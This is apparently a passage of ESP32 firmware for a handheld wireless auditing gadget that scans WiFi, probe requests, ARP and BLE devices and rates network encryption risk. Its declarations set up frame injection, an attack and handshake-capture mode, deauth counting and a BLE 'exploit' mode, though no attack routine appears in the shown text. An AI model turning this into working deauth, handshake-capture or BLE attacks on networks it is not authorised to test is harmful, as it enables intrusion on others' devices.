// ============================================================================
//  WiFi Security Scanner
//
// - Wifi Scanner
// - Probe Sniffer
// - ARP Scanner
// - BLE Scanner
// - Attack Mode / Handshake Capture
// - Scan Sessions
// - Web Report
//
//  Hardware: Heltec Wireless Paper V1.2 (ESP32-S3 + SX1262)
//  Author: Robert Russell
// ============================================================================

#include <heltec-eink-modules.h>
EInkDisplay_WirelessPaperV1_2 display;

#include <WiFi.h>
#include <WebServer.h>
#include <Adafruit_GFX.h>
#include <U8g2_for_Adafruit_GFX.h>
#include <esp_timer.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <esp_sleep.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

#include <LittleFS.h>
#define FS LittleFS

extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t wifi_if, void* buffer, uint16_t len);

U8G2_FOR_ADAFRUIT_GFX u8g2;

// ============================================================================
//  Screen dimensions (Heltec Wireless Paper V1.2 in landscape mode)
// ============================================================================
static const int SCREEN_W = 250;
static const int SCREEN_H = 122;
static const int MARGIN_X = 6;

// ============================================================================
//  Button timing (milliseconds)
//  Tune these if clicks feel too sensitive or too sluggish
// ============================================================================
static const uint32_t DOUBLE_MS         = 300;
static const uint32_t TRIPLE_MS         = 600;
static const uint32_t LONG_MS           = 850;
static const uint32_t DEBOUNCE_MS       = 14;
static const bool     ENABLE_DEEP_SLEEP = true;
static const uint32_t SLEEP_AFTER_MS    = 600000UL; // 10 minutes

// ============================================================================
//  Scan settings
// ============================================================================
static const int      MAX_SCAN           = 20;
static const uint32_t AUTO_SCAN_INTERVAL = 20000; // ms between background scans

// ============================================================================
//  Hardware pins
// ============================================================================
#define BTN         0
#define HAS_BATTERY 1
#if HAS_BATTERY
  #define BAT_ADC_CTRL 19
  #define BAT_ADC_IN   20
#endif

// ============================================================================
//  Fonts
// ============================================================================
const uint8_t* MAIN_FONT = u8g2_font_helvR08_te;
const uint8_t* BOLD_FONT = u8g2_font_helvB08_te;

// ============================================================================
//  Access point credentials for web report mode
// ============================================================================
static const char* AP_SSID = "WiFi-Security-Scanner";
static const char* AP_PASS = "SetYourOwnPassword";
static const char* ARP_AP_SSID  = "ARP-Config";
static const char* ARP_AP_PASS  = "SetYourOwnPassword";

// ============================================================================
//  Display adapter
// ============================================================================
class HeltecGFXAdapter : public Adafruit_GFX {
public:
  explicit HeltecGFXAdapter(EInkDisplay_WirelessPaperV1_2& d)
    : Adafruit_GFX(SCREEN_W, SCREEN_H), disp(d) {}

  void drawPixel(int16_t x, int16_t y, uint16_t color) override {
    if (x < 0 || y < 0 || x >= SCREEN_W || y >= SCREEN_H) return;
    uint16_t c = color ? BLACK : WHITE;
    disp.drawPixel(SCREEN_H - 1 - y, x, c);
  }

private:
  EInkDisplay_WirelessPaperV1_2& disp;
};
HeltecGFXAdapter gfx(display);

// ============================================================================
//  Application mode
// ============================================================================
enum Mode {
  MODE_MENU,
  MODE_RESULTS,
  MODE_DETAIL,
  MODE_WEBREPORT,
  MODE_SESSIONS,
  MODE_PROBE,
  MODE_ARP_CONFIG,
  MODE_ARP,
  MODE_BLE,
  MODE_BLE_DETAIL,
  MODE_BLE_EXPLOIT,
  MODE_ATTACK_MENU,
  MODE_TARGET_SELECT,
  MODE_HANDSHAKE
};
Mode mode = MODE_MENU;

// ============================================================================
//  Button ISR queue
// ============================================================================
static const uint8_t  BTN_Q                       = 64;
static const uint32_t BTN_QUEUE_RECOVER_THRESHOLD = 10;
volatile uint8_t  btnQHead       = 0;
volatile uint8_t  btnQTail       = 0;
volatile bool     btnQState[BTN_Q];
volatile uint32_t btnQTimeMs[BTN_Q];
volatile uint32_t g_isrDropCount = 0;

static inline uint32_t isrNowMs() {
  return (uint32_t)(esp_timer_get_time() / 1000ULL);
}

void IRAM_ATTR btnISR() {
  uint8_t next = (uint8_t)((btnQHead + 1) % BTN_Q);
  if (next == btnQTail) {
    btnQTail = (uint8_t)((btnQTail + 1) % BTN_Q);
    g_isrDropCount++;
  }
  btnQState[btnQHead]  = (digitalRead(BTN) == LOW);
  btnQTimeMs[btnQHead] = isrNowMs();
  btnQHead = next;
}

// ============================================================================
//  ButtonState
// ============================================================================
struct ButtonState {
  bool     stablePressed     = false;
  uint32_t lastStableChange  = 0;
  uint32_t pressStart        = 0;
  bool     pressArmed        = false;
  uint32_t lastRelease       = 0;
  uint32_t firstClickRelease = 0;
  uint8_t  clickCount        = 0;

  bool shortClick  = false;
  bool doubleClick = false;
  bool tripleClick = false;
  bool longClick   = false;

  void resetClicks() {
    shortClick = false; doubleClick = false;
    tripleClick = false; longClick = false;
  }

  void resetState() {
    stablePressed = false;
    lastStableChange = pressStart = lastRelease = firstClickRelease = 0;
    pressArmed = false; clickCount = 0;
    resetClicks();
  }

  bool anyClick() const {
    return shortClick || doubleClick || tripleClick || longClick;
  }

  void poll() {
    resetClicks();
    uint8_t headSnap;
    noInterrupts(); headSnap = btnQHead; interrupts();

    while (btnQTail != headSnap) {
      noInterrupts();
      bool     rawPressed = btnQState[btnQTail];
      uint32_t edgeT      = btnQTimeMs[btnQTail];
      btnQTail = (uint8_t)((btnQTail + 1) % BTN_Q);
      interrupts();

      if ((uint32_t)(edgeT - lastStableChange) <= DEBOUNCE_MS) continue;
      if (rawPressed == stablePressed) continue;

      bool prevPressed = stablePressed;
      stablePressed    = rawPressed;
      lastStableChange = edgeT;

      if (!prevPressed && stablePressed) {
        pressStart = edgeT;
        pressArmed = true;
      }
      if (prevPressed && !stablePressed) {
        if (pressArmed) {
          uint32_t dur = (uint32_t)(edgeT - pressStart);
          if (dur >= LONG_MS) {
            clickCount = 0; longClick = true;
          } else {
            clickCount++;
            lastRelease = edgeT;
            if (clickCount == 1) firstClickRelease = edgeT;
          }
        }
        pressArmed = false; pressStart = 0;
      }
    }

    if (clickCount > 0) {
      uint32_t now  = millis();
      bool     emit = false;
      if      (clickCount <= 2) emit = (uint32_t)(now - lastRelease)       > DOUBLE_MS;
      else if (clickCount == 3) emit = (uint32_t)(now - firstClickRelease) > TRIPLE_MS;

      if (emit) {
        if      (clickCount == 1) shortClick  = true;
        else if (clickCount == 2) doubleClick = true;
        else if (clickCount == 3) tripleClick = true;
        clickCount = 0;
      }
    }
  }
} btns;

// Flush any queued events after a display update to prevent
// stale presses carrying into the next loop iteration
static void resetInputFrontend() {
  // Wait for the button that triggered this transition to be physically released
  uint32_t deadline = millis() + 600;
  while (digitalRead(BTN) == LOW && (uint32_t)(millis()) < deadline) delay(1);
  delay(DEBOUNCE_MS + 2);

  // Discard only events that happened BEFORE this moment
  // Events queued after release are intentional and should be processed
  noInterrupts();
  uint8_t headNow = btnQHead;
  interrupts();
  btnQTail = headNow;
  btns.resetState();
}

uint32_t lastUserActionMs    = 0;
uint32_t lastUiInteractionMs = 0;
static void markUserActivity() { lastUserActionMs = millis(); }
static bool g_pauseAutoScan  = false;

// ============================================================================
//  Battery measurement
//
//  Reads ADC through a voltage divider gated by BAT_ADC_CTRL.
//  Uses a 21-sample median filter to reject ADC noise.
//  Maps 3.0V → 0%, 4.2V → 100%.
// ============================================================================
#if HAS_BATTERY
static int cmpUint16(const void* a, const void* b) {
  return (int)(*(uint16_t*)a) - (int)(*(uint16_t*)b);
}

static uint32_t readAdcMilliVoltsStable() {
  pinMode(BAT_ADC_CTRL, OUTPUT);
  digitalWrite(BAT_ADC_CTRL, LOW);
  delay(12);
  (void)analogReadMilliVolts(BAT_ADC_IN);
  delay(3);
  (void)analogReadMilliVolts(BAT_ADC_IN);
  delay(3);
  const int N = 21;
  uint16_t  vals[N];
  for (int i = 0; i < N; i++) { vals[i] = (uint16_t)analogReadMilliVolts(BAT_ADC_IN); delay(2); }
  pinMode(BAT_ADC_CTRL, INPUT);
  qsort(vals, N, sizeof(vals[0]), cmpUint16);
  uint32_t sum = 0;
  for (int i = 3; i < (N - 3); i++) sum += vals[i];
  return sum / (uint32_t)(N - 6);
}

static int g_cachedBatteryPct   = -1;
static uint32_t g_lastBatReadMs = 0;
static const uint32_t BAT_CACHE_MS = 180000; // 3 minutes

static int batteryPercent() {
  uint32_t mv = readAdcMilliVoltsStable();
  float    v  = (mv / 1000.0f) * 2.0f;
  if (v < 3.0f) return 0;
  if (v > 4.2f) return 100;
  return (int)((v - 3.0f) / 1.2f * 100.0f);
}

static void drawBattery() {
  uint32_t now = millis();
  if (g_cachedBatteryPct < 0 || (uint32_t)(now - g_lastBatReadMs) > BAT_CACHE_MS) {
    g_cachedBatteryPct = batteryPercent();
    g_lastBatReadMs    = now;
  }
  int pct = g_cachedBatteryPct;
  const int iconW = 18, iconH = 9;
  int x = SCREEN_W - MARGIN_X - iconW;
  int y = 2;
  gfx.drawRect(x, y, iconW, iconH, 1);
  gfx.fillRect(x + iconW, y + 2, 2, iconH - 4, 1);
  int fillW = ((iconW - 2) * pct) / 100;
  if (fillW > 0) gfx.fillRect(x + 1, y + 1, fillW, iconH - 2, 1);
  u8g2.setFont(u8g2_font_5x8_tf);
  char buf[8]; snprintf(buf, sizeof(buf), "%d%%", pct);
  int wTxt = u8g2.getUTF8Width(buf);
  u8g2.setCursor(x - 4 - wTxt, y + 7);
  u8g2.print(buf);
}
#endif

// ============================================================================
//  Anomaly detection flags
// ============================================================================
#define ANOM_DUPLICATE_SSID  0x01
#define ANOM_AUTH_CHANGE     0x02
#define ANOM_BSSID_ROTATION  0x04
#define ANOM_CHANNEL_SHIFT   0x08
#define ANOM_EVIL_TWIN       0x10

// ============================================================================
//  Probe request database
// ============================================================================
#define MAX_PROBES 500
#define MAX_PROBE_SESSIONS 200
#define PROBE_CHANNEL_COUNT 3

struct ProbeResult {
  uint8_t  mac[6];
  char     ssid[33];
  int8_t   rssi;
  uint32_t firstSeen;
  uint32_t lastSeen;
  uint16_t count;
  bool     randomized;
};

static ProbeResult g_probes[MAX_PROBES];
static int         g_probeCount = 0;
static bool        g_probeActive = false;
static int         g_probeChannel = 0;
static uint32_t    g_lastHop      = 0;
static uint16_t    g_probeNext    = 0;
static uint16_t    g_probeTotal   = 0;
static volatile uint32_t g_probeTotalSeen = 0;
static bool        g_probeIndexLoaded = false;
static volatile uint32_t  g_deauthCount   = 0;
static uint32_t           g_lastDeauthMs  = 0;

struct ChannelStat {
  uint8_t  channel;
  uint32_t score;
};
static ChannelStat g_channelStats[13];
static uint8_t     g_channelOrder[13];

struct ClientResult {
  uint8_t  clientMac[6];
  uint8_t  apBssid[6];
  uint32_t lastSeen;
};

static ClientResult g_clients[100];
static int          g_clientCount = 0;

// ============================================================================
//  Handshake storage
// ============================================================================

#define MAX_HANDSHAKES 50

struct HandshakeMeta {
    uint32_t timestamp;
    char ssid[33];
    uint8_t bssid[6];
    uint8_t channel;
    uint16_t eapolCount;
    char filename[20];
};

struct HandshakeIndex {
    uint16_t count;
    uint16_t next;
    HandshakeMeta sessions[MAX_HANDSHAKES];
};

static HandshakeIndex g_handshakeIndex;
static bool g_handshakeIndexLoaded = false;

// ============================================================================
//  Session storage
//
//  Each scan session is saved as a CSV file in /sessions/
//  An index file /sessions/index.bin tracks metadata for all sessions.
//  Maximum 200 sessions, ring buffer - oldest overwritten when full.
// ============================================================================
#define MAX_SESSIONS 200

struct SessionMeta {
  uint32_t scanNumber;
  uint32_t timestamp;
  uint16_t apCount;
  uint16_t anomalyCount;
  char     filename[16];
};

struct SessionIndex {
  uint16_t    count;
  uint16_t    next;
  uint32_t    scanCounter;
  SessionMeta sessions[MAX_SESSIONS];
};

static SessionIndex g_sessionIndex;
static bool         g_sessionIndexLoaded = false;

// Explicit declarations for functions used before their definitions.
static void saveProbeSession();
static void saveArpSession();
static void saveBleSession();

// Active session tracking
static bool     g_sessionActive          = false;
static uint16_t g_sessionSlot            = 0;
static uint8_t  g_scansSinceSessionSave  = 0;
static const uint8_t SESSION_SAVE_EVERY  = 5;

// ============================================================================
//  ARP session storage
// ============================================================================
#define MAX_ARP_SESSIONS 200

static uint16_t g_arpSessionNext   = 0;
static uint16_t g_arpSessionTotal  = 0;
static bool     g_arpSessionIndexLoaded = false;

// ============================================================================
//  BLE Scanner
// ============================================================================
#define MAX_BLE_DEVICES 100
#define MAX_BLE_SESSIONS 200

struct BleDevice {
  uint8_t  mac[6];
  char     name[32];
  int8_t   rssi;
  uint8_t  macType;        // 0=public, 1=random static, 2=random resolvable
  bool     connectable;
  uint16_t manufacturer;   // manufacturer ID
  bool     isIoT;          // flagged as IoT device
  bool     isApple;
  bool     isSamsung;
  bool     isFitness;
  uint8_t  serviceCount;
  uint32_t firstSeen;
  uint32_t lastSeen;
  uint16_t count;
};

static BleDevice  g_bleDevices[MAX_BLE_DEVICES];
static int        g_bleCount        = 0;
static bool       g_bleActive       = false;
static uint16_t   g_bleScanNext     = 0;
static uint16_t   g_bleScanTotal    = 0;
static bool       g_bleIndexLoaded  = false;
static BLEScan*   g_bleScan         = nullptr;
static int        g_bleScrollOffset = 0;

// BLE exploit state
static int            g_bleSelectedIdx    = -1;
static int            g_blePrevSelected   = -1;
static BLEClient*     g_bleClient         = nullptr;
static bool           g_bleConnected      = false;

struct BleCharInfo {
  char     uuid[37];
  uint8_t  value[32];
  uint8_t  valueLen;
  bool     canRead;
  bool     canWrite;
  bool     canNotify;
};

static BleCharInfo g_bleChars[20];
static int         g_bleCharCount = 0;

// ============================================================================
//  BLE device classification
// ============================================================================
static const char* bleVendorName(uint16_t manufacturer) {
  switch (manufacturer) {
    case 0x0006: return "Microsoft";
    case 0x000D: return "Texas Instruments";
    case 0x000F: return "Broadcom";
    case 0x0010: return "Mitel";
    case 0x001D: return "Qualcomm";
    case 0x0025: return "NXP/Philips";
    case 0x0030: return "STMicro";
    case 0x003C: return "BlackBerry";
    case 0x004C: return "Apple";
    case 0x004F: return "Polar";
    case 0x0059: return "Nordic Semi";
    case 0x0065: return "Realtek";
    case 0x0075: return "Samsung";
    case 0x0077: return "Garmin";
    case 0x0087: return "CSR";
    case 0x00A0: return "Lenovo";
    case 0x00C4: return "LG";
    case 0x00D2: return "Bose";
    case 0x00E0: return "Google";
    case 0x00E5: return "Tesla";
    case 0x00FE: return "Huawei";
    case 0x0118: return "Tile";
    case 0x0131: return "Sony";
    case 0x0157: return "Fitbit";
    case 0x0171: return "Amazon";
    case 0x01DA: return "Xiaomi";
    case 0x0215: return "Anker";
    case 0x022D: return "DJI";
    case 0x02D0: return "Reaktor";
    case 0x0312: return "Nintendo";
    case 0x038F: return "Jabra";
    case 0x03DA: return "Logitech";
    case 0x0499: return "Ruuvi";
    case 0x05A7: return "Nothing";
    case 0x0600: return "Meta";
    case 0x0850: return "Beats";
    case 0x0881: return "JBL";
    case 0xFFFF: return "Test Vendor";
    default:     return "Unknown";
  }
}

static bool bleIsIoT(uint16_t manufacturer, const char* name, uint8_t serviceCount) {
  // No name + custom services = likely IoT
  if (name[0] == '\0' && serviceCount > 0) return true;

  // Known IoT name patterns
  if (strstr(name, "ESP"))        return true; // ESP32 devices
  if (strstr(name, "Shelly"))     return true; // Shelly smart home
  if (strstr(name, "Tuya"))       return true; // Tuya platform
  if (strstr(name, "SmartLife"))  return true; // Tuya SmartLife
  if (strstr(name, "eWeLink"))    return true; // Sonoff/eWeLink
  if (strstr(name, "TP-LINK"))    return true; // TP-Link
  if (strstr(name, "Tapo"))       return true; // TP-Link Tapo
  if (strstr(name, "Kasa"))       return true; // TP-Link Kasa
  if (strstr(name, "Nest"))       return true; // Google Nest
  if (strstr(name, "Ring"))       return true; // Ring doorbell
  if (strstr(name, "Blink"))      return true; // Blink cameras
  if (strstr(name, "Arlo"))       return true; // Arlo cameras
  if (strstr(name, "Eufy"))       return true; // Eufy
  if (strstr(name, "Wyze"))       return true; // Wyze
  if (strstr(name, "Roborock"))   return true; // Roborock vacuums
  if (strstr(name, "Mijia"))      return true; // Xiaomi Mijia
  if (strstr(name, "Aqara"))      return true; // Aqara sensors
  if (strstr(name, "Yeelight"))   return true; // Yeelight bulbs
  if (strstr(name, "Jura"))       return true;
  if (strstr(name, "IKEA"))       return true;
  if (strstr(name, "Hue"))        return true;
  if (strstr(name, "Tradfri"))    return true;
  if (strstr(name, "Sonos"))      return true;
  if (strstr(name, "Nespresso"))  return true;
  if (strstr(name, "Xiaomi"))     return true;
  if (strstr(name, "LYWSD"))      return true; // Xiaomi temp sensor
  if (strstr(name, "GVH"))        return true; // Govee sensors
  if (strstr(name, "iNode"))      return true;

  return false;
}

// ============================================================================
//  BLE advertised device callback
// ============================================================================
class BleCallback : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    if (!g_bleActive) return;

    // Parse MAC
    uint8_t mac[6];
    String addr = dev.getAddress().toString();
    sscanf(addr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &mac[5], &mac[4], &mac[3], &mac[2], &mac[1], &mac[0]);

    // Check if already tracked
    for (int i = 0; i < g_bleCount; i++) {
      if (memcmp(g_bleDevices[i].mac, mac, 6) == 0) {
        g_bleDevices[i].rssi     = dev.getRSSI();
        g_bleDevices[i].lastSeen = millis();
        g_bleDevices[i].count++;
        return;
      }
    }

    if (g_bleCount >= MAX_BLE_DEVICES) return;

    // New device
    BleDevice& d = g_bleDevices[g_bleCount];
    memset(&d, 0, sizeof(d));
    memcpy(d.mac, mac, 6);
    d.rssi        = dev.getRSSI();
    d.connectable = dev.isAdvertisingService(BLEUUID((uint16_t)0)) ? false : dev.getAdvType() == 0;
    d.firstSeen   = millis();
    d.lastSeen    = millis();
    d.count       = 1;
    d.macType     = (uint8_t)dev.getAddressType();

    if (dev.haveName()) {
      String n = dev.getName();
      strncpy(d.name, n.c_str(), 31);
      d.name[31] = '\0';
    }

    // Manufacturer
    if (dev.haveManufacturerData()) {
      String mfr = dev.getManufacturerData();
      if (mfr.length() >= 2) {
        d.manufacturer = (uint8_t)mfr[0] | ((uint8_t)mfr[1] << 8);
      }
    }

    // Service count
    d.serviceCount = dev.getServiceUUIDCount();

    // Classification
    d.isApple   = (d.manufacturer == 0x004C);
    d.isSamsung = (d.manufacturer == 0x0075);
    d.isFitness = (d.manufacturer == 0x0157 || d.manufacturer == 0x0077 ||
                   d.manufacturer == 0x004F);
    d.isIoT     = bleIsIoT(d.manufacturer, d.name, d.serviceCount);

    // Serial log
    Serial.printf("BLE: %s [%s] RSSI:%d %s%s%s%s\n",
      d.name[0] ? d.name : "(unnamed)",
      addr.c_str(),
      d.rssi,
      d.isApple   ? "Apple "   : "",
      d.isSamsung ? "Samsung " : "",
      d.isFitness ? "Fitness " : "",
      d.isIoT     ? "IoT "     : "");

    g_bleCount++;
  }
};

static BleCallback g_bleCallback;

// ============================================================================
//  Scan result
//
//  Stores everything needed for the summary row and detail view.
//  MB (link rate) is inferred from auth mode, the ESP32 scan API
//  does not expose raw 802.11 information elements.
// ============================================================================
struct ScanResult {
  char    essid[33];  // network name
  uint8_t bssid[6];   // access point MAC
  int     rssi;       // signal strength (dBm)
  int     channel;    // WiFi channel
  int     maxRate;    // estimated link rate (Mbps)
  bool    rateIsN;    // true = append 'n' suffix (802.11n)
  uint8_t authMode;   // raw wifi_auth_mode_t
  uint8_t riskLevel;  // 0=LOW 1=MEDIUM 2=HIGH 3=CRITICAL
  uint32_t firstSeen;
  uint32_t lastSeen;
  uint16_t sightings;
  uint8_t  anomalyFlags;
  uint8_t  lastAuthMode;
  uint8_t  lastChannel;
};

// Current scan window (shown in summary list)
static ScanResult g_results[MAX_SCAN];
static int        g_resultCount     = 0;
static int        g_scrollOffset    = 0;
static int        g_cursorIndex     = 0;
static bool       g_hasScanned      = false;
static int        g_prevCursorIndex = -1; // for partial cursor refresh

// Historical database - persists across scans, keyed by BSSID
// Stores strongest RSSI seen per unique access point
static ScanResult g_seen[200];
static int        g_seenCount   = 0;
static bool       g_scanRunning = false;
static uint32_t   lastAutoScanMs = 0;

// ============================================================================
//  BSSID / MB formatting
//  Defined after ScanResult to avoid forward declaration issues
// ============================================================================
static void bssidFull(const uint8_t* b, char* out, size_t len) {
  snprintf(out, len, "%02X:%02X:%02X:%02X:%02X:%02X",
           b[0], b[1], b[2], b[3], b[4], b[5]);
}

static void bssidShort(const uint8_t* b, char* out, size_t len) {
  snprintf(out, len, "%02X:%02X", b[4], b[5]);
}

static void mbStr(int maxRate, bool rateIsN, char* out, size_t len) {
  if (rateIsN) snprintf(out, len, "%dn", maxRate);
  else         snprintf(out, len, "%d",  maxRate);
}

static int findSeenByBssid(const uint8_t* bssid) {
  for (int i = 0; i < g_seenCount; i++) {
    bool match = true;
    for (int j = 0; j < 6; j++) {
      if (g_seen[i].bssid[j] != bssid[j]) { match = false; break; }
    }
    if (match) return i;
  }
  return -1;
}

// ============================================================================
//  Network classification
//
//  Risk scores:
//    3 = CRITICAL = no encryption or broken (OPEN, WEP)
//    2 = HIGH     = deprecated protocol (WPA1)
//    1 = MEDIUM   = acceptable but not current best practice (WPA2)
//    0 = LOW      = current standard (WPA3 or WPA2/WPA3 transition)
// ============================================================================
static const char* encLabel(uint8_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN:          return "OPEN";
    case WIFI_AUTH_WEP:           return "WEP";
    case WIFI_AUTH_WPA_PSK:       return "WPA1";
    case WIFI_AUTH_WPA2_PSK:      return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:  return "WPA2";
    case WIFI_AUTH_WPA3_PSK:      return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA3";
    default:                      return "UNK";
  }
}

static const char* cipherLabel(uint8_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN:          return "NONE";
    case WIFI_AUTH_WEP:           return "WEP";
    case WIFI_AUTH_WPA_PSK:       return "TKIP";
    case WIFI_AUTH_WPA2_PSK:      return "CCMP";
    case WIFI_AUTH_WPA_WPA2_PSK:  return "CCMP";
    case WIFI_AUTH_WPA3_PSK:      return "CCMP";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "CCMP";
    default:                      return "?";
  }
}

static const char* authLabel(uint8_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN:          return "OPN";
    case WIFI_AUTH_WEP:           return "SKA";
    case WIFI_AUTH_WPA_PSK:       return "PSK";
    case WIFI_AUTH_WPA2_PSK:      return "PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:  return "PSK";
    case WIFI_AUTH_WPA3_PSK:      return "SAE";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "SAE";
    default:                      return "?";
  }
}

static uint8_t calcRisk(uint8_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN:          return 3;
    case WIFI_AUTH_WEP:           return 3;
    case WIFI_AUTH_WPA_PSK:       return 2;
    case WIFI_AUTH_WPA_WPA2_PSK:  return 2;
    case WIFI_AUTH_WPA2_PSK:      return 1;
    case WIFI_AUTH_WPA2_WPA3_PSK: return 0;
    case WIFI_AUTH_WPA3_PSK:      return 0;
    default:                      return 1;
  }
}

static const char* riskSym(uint8_t risk) {
  switch (risk) {
    case 0:  return " OK";
    case 1:  return "MED";
    case 2:  return " HI";
    default: return "!!!";
  }
}

static const char* riskWord(uint8_t risk) {
  switch (risk) {
    case 0:  return "LOW";
    case 1:  return "MEDIUM";
    case 2:  return "HIGH";
    default: return "CRITICAL";
  }
}

static const char* riskColor(uint8_t risk) {
  switch (risk) {
    case 0:  return "#2ecc71";
    case 1:  return "#f39c12";
    case 2:  return "#e67e22";
    default: return "#e74c3c";
  }
}

// ============================================================================
//  UI layout constants
// ============================================================================
static const int UI_MARGIN_X      = 6;
static const int UI_HEADER_Y      = 12;
static const int UI_HEADER_LINE   = 16;
static const int UI_FOOTER_LINE   = SCREEN_H - 11;
static const int UI_FOOTER_TEXT   = SCREEN_H - 2;
static const int MENU_TOP         = 26;
static const int MENU_ROW_H       = 16;
static const int SUMMARY_TOP      = 25;
static const int SUMMARY_ROW_H    = 9;
static const int SUMMARY_ROWS     = 10;
static const int MENU_ITEMS       = 7;
static const int MENU_VISIBLE     = 5;
static int       menuSelected     = 0;
static int       menuScrollOffset = 0;

static const char* menuLabels[MENU_ITEMS] = {
  "WiFi Scan",
  "Probe Sniffer",
  "ARP Scanner",
  "BLE Scanner",
  "Attack Mode",
  "Scan Sessions",
  "Web Report"
};

// ============================================================================
//  Frame helpers
//
//  NOTE: u8g2.begin() must only be called once in setup().
//  Calling it inside beginFrame resets font state and corrupts rendering.
// ============================================================================
static void beginFrame(bool fast = true) {
  if (fast) display.fastmodeOn();
  else      display.fastmodeOff();
  display.clear();
}

static void endFrame() {
  display.update();
}

// ============================================================================
//  Shared header and footer - drawn on every screen
// ============================================================================
static void drawHeader(const char* title) {
#if HAS_BATTERY
  drawBattery();
#endif
  u8g2.setFont(BOLD_FONT);
  u8g2.setCursor(UI_MARGIN_X, UI_HEADER_Y);
  u8g2.print(title);
  gfx.drawFastHLine(UI_MARGIN_X, UI_HEADER_LINE, SCREEN_W - (UI_MARGIN_X * 2), 1);
}

static void drawFooter(const char* hint) {
  gfx.drawFastHLine(UI_MARGIN_X, UI_FOOTER_LINE, SCREEN_W - (UI_MARGIN_X * 2), 1);
  u8g2.setFont(u8g2_font_5x8_tf);
  u8g2.setCursor(UI_MARGIN_X, UI_FOOTER_TEXT);
  u8g2.print(hint);
}

// ============================================================================
//  Main menu
//
//  drawMenuRow      = renders one item (bold + dot when selected)
//  drawMenuItems    = renders all items, used by full and partial refresh
//  drawMenu         = full refresh, called on first entry
//  updateMenuCursor = partial refresh on cursor move, full every 5 moves
// ============================================================================
static void drawMenuRow(int y, bool selected, const char* title) {
  if (selected) gfx.fillCircle(UI_MARGIN_X + 3, y + 4, 3, 1);
  u8g2.setFont(selected ? BOLD_FONT : MAIN_FONT);
  u8g2.setCursor(UI_MARGIN_X + 12, y + 9);
  u8g2.print(title);
}

static void drawMenuItems() {
  for (int i = 0; i < MENU_VISIBLE; i++) {
    int itemIdx = menuScrollOffset + i;
    if (itemIdx >= MENU_ITEMS) break;
    int y = MENU_TOP + (i * MENU_ROW_H);
    gfx.fillRect(UI_MARGIN_X, y, SCREEN_W - (UI_MARGIN_X * 2), MENU_ROW_H, 0);
    drawMenuRow(y, itemIdx == menuSelected, menuLabels[itemIdx]);
  }
}

static void drawMenu() {
  beginFrame(false);
  drawHeader("WiFi Security Scanner");
  drawMenuItems();
  drawFooter("1x=next  2x=select  hold=sleep");
  endFrame();
}

static void updateMenuCursor() {
  display.fastmodeOn();
  drawMenuItems();
  display.update();
}

// ============================================================================
//  Scan results - summary list
// ============================================================================
static void drawSummaryRow(int row, int idx) {
  const ScanResult& r = g_results[idx];
  const int y = SUMMARY_TOP + (row * SUMMARY_ROW_H);

  const int X_CURSOR = UI_MARGIN_X;
  const int X_RISK   = UI_MARGIN_X + 8;
  const int X_BSSID  = UI_MARGIN_X + 28;
  const int X_PWR    = UI_MARGIN_X + 66;
  const int X_CH     = UI_MARGIN_X + 92;
  const int X_ENC    = UI_MARGIN_X + 112;
  const int X_ESSID  = UI_MARGIN_X + 144;

  u8g2.setFont(u8g2_font_5x8_tf);

  if (idx == g_cursorIndex) {
    u8g2.setCursor(X_CURSOR, y);
    u8g2.print(">");
  }

  u8g2.setCursor(X_RISK, y);
  if (r.anomalyFlags & (ANOM_EVIL_TWIN | ANOM_AUTH_CHANGE | ANOM_CHANNEL_SHIFT)) {
    u8g2.print("!!!");
  } else if (r.anomalyFlags & (ANOM_DUPLICATE_SSID | ANOM_BSSID_ROTATION)) {
    u8g2.print(" i ");
  } else {
    u8g2.print(riskSym(r.riskLevel));
  }

  char bs[6];
  bssidShort(r.bssid, bs, sizeof(bs));
  u8g2.setCursor(X_BSSID, y);  u8g2.print(bs);

  char pwr[8];
  snprintf(pwr, sizeof(pwr), "%d", r.rssi);
  u8g2.setCursor(X_PWR, y);    u8g2.print(pwr);

  char ch[4];
  snprintf(ch, sizeof(ch), "%d", r.channel);
  u8g2.setCursor(X_CH, y);     u8g2.print(ch);

  u8g2.setCursor(X_ENC, y);    u8g2.print(encLabel(r.authMode));

  char ess[15];
  strncpy(ess, r.essid, 14);
  ess[14] = '\0';
  u8g2.setCursor(X_ESSID, y);  u8g2.print(ess[0] ? ess : "---");
}

static void drawSummary() {
  g_prevCursorIndex = g_cursorIndex;

  beginFrame(false);
  drawHeader("Scan Results");
  u8g2.setFont(u8g2_font_5x8_tf);

  if (g_resultCount == 0) {
    u8g2.setFont(MAIN_FONT);
    u8g2.setCursor(UI_MARGIN_X, 42);
    u8g2.print("No networks found...");
    drawFooter("hold=menu");
    endFrame();
    return;
  }

  int shown = 0;
  for (int i = g_scrollOffset; i < g_resultCount && shown < SUMMARY_ROWS; i++, shown++) {
    drawSummaryRow(shown, i);
  }

  char footer[48];
  if (g_resultCount > SUMMARY_ROWS) snprintf(footer, sizeof(footer), "Seen:%d  1x=cur  2x=page  3x=detail", g_seenCount);
  else                              snprintf(footer, sizeof(footer), "Seen:%d  1x=cursor  3x=detail  hold=menu", g_seenCount);
  drawFooter(footer);
  endFrame();
}

static void updateSummaryCursor() {
  display.fastmodeOn();

  // Erase and redraw previous row without cursor
  if (g_prevCursorIndex >= 0) {
    int prevRow = g_prevCursorIndex - g_scrollOffset;
    if (prevRow >= 0 && prevRow < SUMMARY_ROWS) {
      gfx.fillRect(UI_MARGIN_X, SUMMARY_TOP + (prevRow * SUMMARY_ROW_H) - 7,
                   SCREEN_W - (UI_MARGIN_X * 2), SUMMARY_ROW_H, 0);
      int saved     = g_cursorIndex;
      g_cursorIndex = -1;
      drawSummaryRow(prevRow, g_prevCursorIndex);
      g_cursorIndex = saved;
    }
  }

  // Erase and redraw current row with cursor
  int curRow = g_cursorIndex - g_scrollOffset;
  if (curRow >= 0 && curRow < SUMMARY_ROWS) {
